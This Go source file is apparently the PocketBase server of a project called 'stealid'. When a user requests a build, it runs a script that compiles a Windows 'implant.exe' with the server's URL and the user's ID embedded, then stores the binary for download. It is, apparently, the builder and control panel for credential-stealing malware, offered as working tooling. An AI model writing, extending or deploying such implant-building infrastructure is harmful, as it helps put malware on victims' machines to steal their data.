package main

import (
	"bytes"
	"io"
	"log"
	"os"

	"os/exec"

	"mime/multipart"

	"github.com/pocketbase/pocketbase"
	"github.com/pocketbase/pocketbase/core"
	"github.com/pocketbase/pocketbase/forms"
	"github.com/pocketbase/pocketbase/plugins/migratecmd"
	"github.com/pocketbase/pocketbase/tools/filesystem"

	_ "github.com/navaneeth-dev/stealid/stealid-pocketbase/migrations"
)

func main() {
	app := pocketbase.New()

	app.OnRecordAfterCreateRequest().Add(func(e *core.RecordCreateEvent) error {
		if e.Record.Collection().Name == "builds" {
			e.Record.Set("status", "building")
			app.Dao().SaveRecord(e.Record)
			go createBuild(app, e.Record.GetId())
		}
		return nil
	})

	migratecmd.MustRegister(app, app.RootCmd, &migratecmd.Options{
		Automigrate: true, // auto creates migration files when making collection changes
	})

	if err := app.Start(); err != nil {
		log.Fatal(err)
	}
}

func createMultipartFormData(fileName string) (string, error) {
	var b bytes.Buffer
	var err error
	w := multipart.NewWriter(&b)
	var fw io.Writer
	file := mustOpen(fileName)
	if fw, err = w.CreateFormFile("implant", file.Name()); err != nil {
		return "", err
	}
	if _, err = io.Copy(fw, file); err != nil {
		return "", err
	}
	w.Close()
	return b.String(), nil
}

func mustOpen(f string) *os.File {
	r, err := os.Open(f)
	if err != nil {
		pwd, _ := os.Getwd()
		log.Println("PWD: ", pwd)
		panic(err)
	}
	return r
}

func createBuild(app *pocketbase.PocketBase, buildID string) {
	record, _ := app.Dao().FindRecordById("builds", buildID)

	log.Println(app.App.Settings().Meta.AppUrl, record.GetString("user"))
	cmd := exec.Command("sh", "build.sh", app.App.Settings().Meta.AppUrl, record.GetString("user"))
	cmd.Dir = "../stealid-implant"
	output, err := cmd.Output()

	if err != nil {
		log.Println(err, string(output))
		record.Set("status", "error")
		app.Dao().SaveRecord(record)
		return
	}

	form := forms.NewRecordUpsert(app, record)
	file1, err := filesystem.NewFileFromPath("../stealid-implant/implant.exe")
	if err != nil {
		log.Println(err)
		record.Set("status", "error")
		app.Dao().SaveRecord(record)
		return
	}

	form.AddFiles("implant", file1)
	form.Submit()
	if err != nil {
		log.Println(err)
		record.Set("status", "error")
		app.Dao().SaveRecord(record)
		return
	}

	// TODO: read file bytes and set out

	log.Println("Build success")
	record.Set("status", "success")
	app.Dao().SaveRecord(record)
}
